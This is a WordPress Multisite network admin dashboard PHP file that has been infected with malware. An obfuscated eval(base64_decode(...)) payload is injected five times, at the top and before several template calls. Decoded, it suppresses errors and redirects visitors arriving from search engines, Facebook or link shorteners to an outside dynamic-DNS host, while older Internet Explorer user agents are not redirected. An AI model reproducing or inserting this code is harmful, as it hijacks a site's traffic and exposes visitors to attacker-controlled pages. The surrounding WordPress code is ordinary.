<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tL2wiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsKaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSBhbmQgIXN0cmlzdHIoJHJlZmVyZXIsIkVlWXAzRDciKSl7CmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9pcnhucmphdy5kZG5zLm1lLnVrLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/**
 * Multisite administration panel.
 *
 * @package WordPress
 * @subpackage Multisite
 * @since 3.0.0
 */

/** Load WordPress Administration Bootstrap */
require_once( './admin.php' );

/** Load WordPress dashboard API */
require_once( ABSPATH . 'wp-admin/includes/dashboard.php' );

if ( !is_multisite() )
	wp_die( __( 'Multisite support is not enabled.' ) );

if ( ! current_user_can( 'manage_network' ) )
	wp_die( __( 'You do not have permission to access this page.' ) );

$title = __( 'Dashboard' );
$parent_file = 'index.php';

$overview = '<p>' . __( 'Welcome to your Network Admin. This area of the Administration Screens is used for managing all aspects of your Multisite Network.' ) . '</p>';
$overview .= '<p>' . __( 'From here you can:' ) . '</p>';
$overview .= '<ul><li>' . __( 'Add and manage sites or users' ) . '</li>';
$overview .= '<li>' . __( 'Install and activate themes or plugins' ) . '</li>';
$overview .= '<li>' . __( 'Update your network' ) . '</li>';
$overview .= '<li>' . __( 'Modify global network settings' ) . '</li></ul>';

get_current_screen()->add_help_tab( array(
	'id'      => 'overview',
	'title'   => __( 'Overview' ),
	'content' => $overview
) );

$quick_tasks = '<p>' . __( 'The Right Now widget on this screen provides current user and site counts on your network.' ) . '</p>';
$quick_tasks .= '<ul><li>' . __( 'To add a new user <strong>click Create a New User</strong>' ) . '</li>';
$quick_tasks .= '<li>' . __( 'To add a new site <strong>click Create a New Site</strong>' ) . '</li></ul>';
$quick_tasks .= '<p>' . __( 'To search for a user or site, use the search boxes.' ) . '</p>';
$quick_tasks .= '<ul><li>' . __( '<strong>To search for a user</strong> enter all or part of a username or email address' ) . '</li>';
$quick_tasks .= '<li>' . __( '<strong>To search for a site</strong> enter the path or domain' ) . '</li></ul>';

get_current_screen()->add_help_tab( array(
	'id'      => 'quick-tasks',
	'title'   => __( 'Quick Tasks' ),
	'content' => $quick_tasks
) );

get_current_screen()->set_help_sidebar(
	'<p><strong>' . __('For more information:') . '</strong></p>' .
	'<p>' . __('<a href="http://codex.wordpress.org/Network_Admin" target="_blank">Documentation on the Network Admin</a>') . '</p>' .
	'<p>' . __('<a href="http://wordpress.org/support/forum/multisite/" target="_blank">Support Forums</a>') . '</p>'
);

wp_dashboard_setup();

wp_enqueue_script( 'dashboard' );
wp_enqueue_script( 'plugin-install' );
add_thickbox();

add_screen_option('layout_columns', array('max' => 4, 'default' => 2) );

require_once( '../admin-header.php' );

?>

<div class="wrap">
<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tL2wiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsKaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSBhbmQgIXN0cmlzdHIoJHJlZmVyZXIsIkVlWXAzRDciKSl7CmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9pcnhucmphdy5kZG5zLm1lLnVrLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ==")); screen_icon(); ?>
<h2><?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tL2wiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsKaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSBhbmQgIXN0cmlzdHIoJHJlZmVyZXIsIkVlWXAzRDciKSl7CmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9pcnhucmphdy5kZG5zLm1lLnVrLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ==")); echo esc_html( $title ); ?></h2>

<div id="dashboard-widgets-wrap">

<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tL2wiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsKaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSBhbmQgIXN0cmlzdHIoJHJlZmVyZXIsIkVlWXAzRDciKSl7CmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9pcnhucmphdy5kZG5zLm1lLnVrLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ==")); wp_dashboard(); ?>

<div class="clear"></div>
</div><!-- dashboard-widgets-wrap -->

</div><!-- wrap -->

<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tL2wiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsKaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSBhbmQgIXN0cmlzdHIoJHJlZmVyZXIsIkVlWXAzRDciKSl7CmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9pcnhucmphdy5kZG5zLm1lLnVrLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ==")); include( '../admin-footer.php' ); ?>
